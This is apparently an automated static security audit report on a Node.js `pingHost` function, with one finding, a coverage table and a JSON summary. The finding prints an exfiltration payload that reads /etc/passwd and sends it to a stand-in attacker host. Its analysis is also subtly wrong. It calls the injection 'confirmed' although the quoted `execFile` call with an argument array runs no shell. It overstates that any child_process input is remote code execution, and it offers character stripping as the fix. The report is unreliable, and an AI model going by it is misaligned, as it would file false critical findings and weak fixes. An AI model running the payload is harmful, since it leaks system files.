```
Active verification: NOT permitted
Target: none
Basis: static review
```

Stack detected: `nodejs`.

## 1) Findings

> **SEC-001: Command injection via user-controlled hostname**
>
> - **Severity**: P0 Critical
> - **Confidence**: confirmed
> - **Mapping**: CWE-78 (OS Command Injection) / ASVS 4.0.3 V5.3.8
> - **File/line**: `pingHost` — `execFile('/sbin/ping', ['-c', '3', host])`
> - **Exploit path**: `host` comes from the caller and is passed into a child process. An
>   attacker supplies `example.com; curl attacker.tld/$(cat /etc/passwd)` and the shell executes
>   the second command. Any user input reaching `child_process` is remote code execution.
> - **Impact**: full command execution as the service account.
> - **Recommended fix**: sanitize `host` by stripping `;`, `|`, `&` and backticks before the call.
> - **Baseline status**: new
> - **Origin**: introduced

## 2) Security Domain Coverage — stack: nodejs

| # | Domain | Verdict | Evidence |
|---|--------|---------|----------|
| 1 | Randomness Safety | N/A | none |
| 2 | Injection & Data-Access Safety | Applicable / **FAIL** | SEC-001 |
| 3 | Sensitive Data Handling | N/A | none |
| 4 | Secret / Config Management | N/A | none |
| 5 | Transport Security | N/A | none |
| 6 | Crypto Primitive Correctness | N/A | none |
| 7 | Concurrency & Shared-State Safety | N/A | none |
| 8 | Language-Specific Injection Sinks | Applicable / **FAIL** | child_process misuse |
| 9 | Static Scanner Posture | N/A | none |
| 10 | Dependency Vulnerability Posture | N/A | none |

## 3) Automation Evidence

None.

## 9) Uncovered Risk List

None.

```json
{
  "summary": { "pass": false, "baseline": "absent" },
  "counts": { "p0": 1, "p1": 0, "p2": 0, "p3": 0, "overflow": 0 },
  "stack": "nodejs",
  "asvs_version": "4.0.3",
  "active_verification": "not_permitted",
  "security_domains": { "required": true, "total": 10, "pass": 0, "fail": 2, "na": 8 },
  "findings": [
    {
      "id": "SEC-001", "severity": "P0", "confidence": "confirmed", "status": "new",
      "origin": "introduced", "cwe": "CWE-78", "asvs": "ASVS 4.0.3 V5.3.8",
      "domain": 2, "file": "lib/ping.js:pingHost"
    }
  ]
}
```
